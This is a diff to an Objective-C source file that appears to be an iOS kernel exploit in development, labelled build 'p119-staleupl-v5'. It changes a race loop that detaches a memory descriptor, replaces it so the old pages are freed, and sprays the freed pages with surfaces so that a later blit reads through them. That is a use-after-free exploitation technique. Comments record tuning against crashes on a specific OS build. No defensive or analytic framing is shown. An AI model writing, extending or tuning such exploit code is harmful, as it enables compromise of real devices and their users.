@@ -57,7 +57,7 @@
 #import <unistd.h>
 #import <sys/mman.h>
 
-#define P119_BUILD      @"p119-staleupl-v4"
+#define P119_BUILD      @"p119-staleupl-v5"
 
 /* the P069 prototype law: mach_vm has no SDK header for these decls */
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
@@ -331,14 +331,10 @@ static NSString *p119_finish(void) {
 
     NSDate *t0 = [NSDate date];
     for (int iter = 0; iter < P119_N && -[t0 timeIntervalSinceNow] < P119_TIME_SEC; iter++) {
-        int dk = -1;
-        for (int tries = 0; tries < 20; tries++) {
-            dk = g_detach(g_ref);
-            if (dk == 0) break;
-            atomic_fetch_add(&g_det_fail, 1);
-            usleep(100);
-        }
-        if (dk != 0) continue;
+        int dk = g_detach(g_ref);   /* v5 POISON-PILL LAW: one attempt; the
+              still-prepared guard is FATAL on 23F77 (2/2 aborts, note 288):
+              retries multiply the death rate — a failed detach = skip round */
+        if (dk != 0) { atomic_fetch_add(&g_det_fail, 1); continue; }
         atomic_fetch_add(&g_det_ok, 1);
         usleep(200);   /* let the wirer's NEXT commit land on the detached MD */
         int rk = g_repl(g_ref, g_data, g_len);
@@ -525,12 +521,7 @@ static NSString *p119_finish(void) {
             /* Stage-3 round: detach-idle → replace (frees old pages) →
              * immediately spray the freed page class with 0xE0 surfaces →
              * the wirer's next blit reads THROUGH them. */
-            int dk = -1;
-            for (int tries = 0; tries < 20; tries++) {
-                dk = g_detach(g_ref);
-                if (dk == 0) break;
-                usleep(100);
-            }
+            int dk = g_detach(g_ref);   /* v5: one attempt (poison-pill law) */
             if (dk != 0) { usleep(2000); continue; }
             usleep(200);
             int rk = g_repl(g_ref, g_data, g_len);
